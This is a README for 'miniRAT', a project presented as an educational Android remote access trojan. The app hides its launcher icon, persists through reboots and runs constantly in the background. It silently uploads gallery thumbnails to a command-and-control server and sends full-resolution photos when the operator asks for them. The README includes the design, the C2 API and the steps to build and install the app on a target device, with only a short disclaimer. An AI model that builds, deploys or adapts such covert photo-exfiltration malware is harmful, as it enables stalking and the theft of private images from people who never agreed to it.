<div align="center">

# 🐀 miniRAT

**A minimal, educational Android Remote Access Trojan**

*Stealth gallery exfiltration • Full image on-demand • Auto-hide from launcher*

[![Android](https://img.shields.io/badge/Android-API%2021+-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com)
[![Node.js](https://img.shields.io/badge/Node.js-16+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
[![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)](LICENSE)

---

*miniRAT silently scans a target device's gallery, exfiltrates thumbnails to a C2 server, and lets you request full-resolution images on demand — all while invisible to the user.*

</div>

## ⚠️ Server Security Notice

> [!CAUTION]
> **The C2 server is NOT production-ready.** It is intended for local testing and development only.
> - No authentication or access control
> - No HTTPS/TLS (plaintext HTTP)
> - No rate limiting or input validation
> - No device identity verification
> - Potential path traversal vectors
>
> **Do NOT expose this server to the public internet.** Use it only in controlled, local network environments.


---

## ⚡ How It Works

```
📱 Target Device                          🖥️ C2 Server (dashboard)
                                          
 App installed → icon vanishes →           node server.js (:5000)
 foreground service starts →               
                                          
 ┌──────── Every 30 sec ────────┐         ┌──────────────────────┐
 │                              │         │                      │
 │  1. HEAD → server up?        │────────▶│  ✓ 200 OK           │
 │     no → idle, retry later   │         │                      │
 │                              │         │                      │
 │  2. Scan gallery             │         │                      │
 │     skip already-uploaded    │         │                      │
 │                              │         │                      │
 │  3. POST thumbnails          │────────▶│  Save to ./uploads   │
 │     (128×128, ~10 KB each)   │         │                      │
 │                              │         │                      │
 │  4. GET /api/requests        │────────▶│  Any full-image      │
 │     any full-image requests? │         │  requests queued?    │
 │                              │         │                      │
 │  5. POST full images         │────────▶│  Save to ./full_res  │
 │     (parallel thread)        │         │                      │
 └──────────────────────────────┘         └──────────────────────┘
```

---

## 🔥 Features

<table>
<tr>
<td width="50%">

### 📱 Android Client
- **Headless mode** — Switches to background-only after first launch
- **Periodic scan** — Every 30 sec, checks for new photos
- **Server-aware** — Only uploads when C2 is reachable
- **Deduplication** — Never re-uploads the same image
- **Full image on-demand** — Server requests → phone uploads full-res
- **All image formats** — JPEG, PNG, WEBP, GIF, HEIC, BMP...
- **Memory-safe** — Downsampled decoding + bitmap recycling
- **WakeLock** — CPU active during scan even with screen off
- **Boot persistence** — BootReceiver + START_STICKY
- **Modular code** — Clean separation of concerns

</td>
<td width="50%">

### 🖥️ C2 Server
- **Live dashboard** — Dark-themed, 3s auto-refresh
- **Request queue** — Click thumbnail → request full image
- **Download button** — Appears when full image arrives
- **Pending indicator** — Shows which requests are in-flight
- **File-based persistence** — Thumbnails + metadata on disk
- **50MB JSON limit** — Handles full-res uploads
- **Path traversal protection** — `path.basename()` sanitization

</td>
</tr>
</table>

---

## 🚀 Quick Start

### 1. Configure

```bash
git clone https://github.com/Rhishavhere/miniRAT.git
cd miniRAT
echo "SERVER_URL=https://your-server.com" > app/local.properties
```

### 2. Start C2

```bash
npm install express cors multer
node server.js
```

### 3. Build & Deploy

```bash
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 4. Usage

1. Tap app icon once → grant permission → icon vanishes
2. Thumbnails start appearing on dashboard
3. Hover any thumbnail → click **"📥 Request Full"**
4. Wait for next scan cycle → **"⬇ Download"** button appears

---

## 📁 Project Structure

```
miniRAT/
│
├── 📱 app/src/main/java/com/app/minirat/
│   ├── HeadlessMode.java         # Entry: permission → service → headless
│   ├── Service.java              # Lifecycle + scan scheduling
│   ├── GalleryScanner.java       # MediaStore queries + image processing
│   ├── NetworkManager.java       # HTTP: ping, upload, request queue
│   ├── UploadTracker.java        # SharedPreferences deduplication
│   ├── MediaItem.java            # Data class (id, uri, name)
│   └── BootReceiver.java         # Auto-restart on reboot
│
├── 🖥️ server.js                   # C2 server + live dashboard
│
└── 📁 uploads/
    ├── *_thumb.jpg                # Thumbnails
    ├── *.metadata.json            # Upload metadata
    ├── requests.json              # Pending request queue
    └── fullsize/                  # Full-resolution images
```

---

## 🌐 API Reference

| Method | Endpoint | Description |
|:---|:---|:---|
| `HEAD` | `/api/thumbnails` | Reachability check |
| `POST` | `/api/upload/thumbnail` | Upload `{ filename, thumbnail }` |
| `POST` | `/api/upload/fullsize` | Upload `{ filename, image }` |
| `GET` | `/api/thumbnails` | List all (with fullsize/pending status) |
| `GET` | `/api/fullsize/:file` | Download full-size image |
| `GET` | `/api/requests` | List pending requests |
| `POST` | `/api/request/:file` | Queue a full-image request |
| `DELETE` | `/api/request/:file` | Mark request as fulfilled |
| `GET` | `/` | Live gallery dashboard |

---


## ⚠️ Disclaimer

> **Educational and authorized security research only.**
> Only install on devices you own or have explicit written authorization to test.
> Unauthorized use against devices you do not own is **illegal** and may violate computer fraud laws.

---

<div align="center">

**Built for learning. Use responsibly.**

</div>
